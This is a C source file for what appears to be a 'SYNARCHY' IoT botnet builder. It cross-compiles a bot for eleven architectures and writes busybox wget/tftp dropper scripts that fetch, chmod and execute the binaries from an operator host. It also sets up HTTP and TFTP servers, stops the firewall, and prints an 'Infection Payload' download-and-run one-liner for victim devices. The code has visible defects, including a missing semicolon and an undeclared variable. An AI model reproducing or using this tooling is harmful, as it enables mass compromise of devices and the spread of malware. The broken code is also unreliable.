#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
char buf[1000] = {0};
char cc_prompt;
char *wget_sh  = "SW";
char *tftp1_sh = "ST1";
char *tftp2_sh = "ST2";
char *wgets[] = { 
	"https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2",
	"https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2",
	"https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2",
	"https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2",
	"https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2",
	"https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2",
	"https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2",
	"https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2",
	"https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2",
	"http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2",
	"https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2"
};
char *targzfiles[] = {
	"cross-compiler-i586.tar.bz2",
	"cross-compiler-m68k.tar.bz2",
	"cross-compiler-mips.tar.bz2",
	"cross-compiler-mipsel.tar.bz2",
	"cross-compiler-powerpc.tar.bz2",
	"cross-compiler-sh4.tar.bz2",
	"cross-compiler-sparc.tar.bz2",
	"cross-compiler-armv4l.tar.bz2",
	"cross-compiler-armv5l.tar.bz2",
	"cross-compiler-armv6l.tar.bz2",
	"cross-compiler-armv7l.tar.bz2"
};
char *archs[] = {
	"i586",
	"m68k",
	"mips",
	"mipsel",
	"powerpc",
	"sh4",
	"sparc",
	"armv4l",
	"armv5l",
	"armv6l",
	"armv7l"
}
char *output[] = {
	"x86",
	"m68k",
	"mips",
	"mpsl",
	"ppc",
	"sh4",
	"sparc",
	"arm",
	"arm5",
	"arm6",
	"arm7"
};

int main(int argc, char *argv[]) {

	if(argc != 3) {
		printf("Usage: %s <botname.c> <host ip>\n", argv[0]);
		exit(0);
	}
	printf("[SYNARCHY] Creating Required Directories");
	sleep(1);
	mkdir("cross-compilers", 777);
	mkdir("release", 777);
	int i;
	printf("[SYNARCHY] Do You Wanna Download Comilers? (Y/n): ");	
	scanf("%s", &cc_prompt);
	while(cc_prompt == 'Y') {
		for(i = 0; i < 11; ++i) {
			printf("[SYNARCHY] WGET Downloading [%s]\n", targzfiles[i]);
			sprintf(buf, "wget %s -q -O cross-compilers/%s", wgets[i], targzfiles[i]);
			system(buf);
			sleep(1);
			printf("[SYNARCHY] Unziping [%s]\n", targzfiles[i]);
			sprintf(buf, "tar -xf cross-compilers/%s -C cross-compilers/", targzfiles[i]);
			system(buf);
			sleep(1);
			printf("[SYNARCHY] Deleting Uneeded Files [%s]\n", targzfiles[i]);
			sprintf(buf, "rm -rf cross-compilers/%s", targzfiles[i]);
			system(buf);
			sleep(1);
		}
		break;
	}
	for(i = 0; i < 11; ++i) {
		printf("[SYNARCHY] Cross Compiling Your Bot [%s]\n", output[i]);
		sprintf(buf, "./cross-compilers/cross-compiler-%s/bin/%s-gcc -static -o release/%s %s", archs[i], archs[i], output[i], argv[1]);
		system(buf);
		printf("[SYNARCHY] Stripping bin [%s]\n", archs[i]);
		sprintf(buf, "./cross-compilers/cross-compiler-%s/bin/%s-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr release/%s", archs[i], archs[i], output[i]);
		system(buf);
		printf("[SYNARCHY] Finished Compiling Now Setting Up SH Files\n");
	}
	sprintf(buf, "echo '#!/bin/sh' >> %s", wget_sh);
	system(buf);
	
	sprintf(buf, "echo '#!/bin/sh' >> %s", tftp1_sh);
	system(buf);
	
	sprintf(buf, "echo '#!/bin/sh' >> %s", tftp2_sh);
	system(buf);
	for(i = 0; i < 11; ++i) {
		printf("[SYNARCHY] Adding To Wget SH File [%s]\n", output[i]);
		sprintf(buf, "echo 'busybox wget http://%s/KAI/%s; busybox chmod 777 %s; ./%s; rm -rf %s' >> %s", ip, output[i], output[i], output[i], output[i], wget_sh);	
		system(buf);
		printf("[SYNARCHY] Adding To Tftp1 SH File [%s]\n", output[i]);
		sprintf(buf, "echo 'busybox tftp -g %s -r %s; busybox chmod 777 %s; ./%s; rm -rf %s' >> %s", ip, output[i], output[i], output[i], output[i], tftp1_sh);
		system(buf);
		printf("[SYNARCHY] Adding To Tftp2 SH File [%s]\n", output[i]);
		sprintf(buf, "echo 'busybox tftp %s -c get %s; busybox chmod 777 %s; ./%s rm -rf %s' >> %s", ip, output[i], output[i], output[i], output[i], tftp2_sh);
		system(buf);
	}
	printf("[SYNARCHY] Installing Apache2 And TFTP\n");
	system("yum install httpd tftp xinetd -y");
	printf("[SYNARCHY] Making Directory: /var/lib/tftpboot\n");
	system("mkdir /var/lib/tftpboot");
	printf("[SYNARCHY] Clearing HTTP And TFTP Directories");
	system("rm -rf /var/www/html/* /var/lib/tftpboot/*");
	printf("[SYNARCHY] Moving SH Files To Their Directories");
	sprintf(buf, "mv %s /var/www/html/ && mv %s %s /var/lib/tftpboot/", wget_sh, tftp1_sh, tftp2_sh);
	system(buf);
	system("wget https://pastebin.com/raw/AMLTHcEh -O /etc/init.d/tftp");
	printf("[SYNARCHY] Restarting Apache2 And Stopping Iptables.\n");
	system("service httpd restart; service iptables stop");
	system("service apache2 restart");
	printf("[SYNARCHY] Restart TFTP/Xinetd\n");
	system("service xinetd restart");
	printf("[SYNARCHY] Setting Ulimit\n");
	system("ulimit -s 999999;ulimit -SH 999999;ulimit -r 999999;ulimit -n 999999");
	printf("[SYNARCHY] Infection Payload:\r\n cd /tmp/ || cd /var/; busybox wget http://%s/%s; busybox chmod 777 %s; sh %s; rm -rf %s; busybox tftp -g %s -r %s; busybox chmod 777 %s; sh %s; rm -rf %s; busybox tftp %s -c get %s; busybox chmod 777 %s; sh %s; rm -rf %s\n", ip, wget_sh, wget_sh, wget_sh, wget_sh, ip, tftp1_sh, tftp1_sh, tftp1_sh, tftp1_sh, ip, tftp2_sh, tftp2_sh, tftp2_sh, tftp2_sh);
	printf("[SYNARCHY] Finished Compiling, Dont forget to set ulimit in bashrc.\n");
	return 0;
}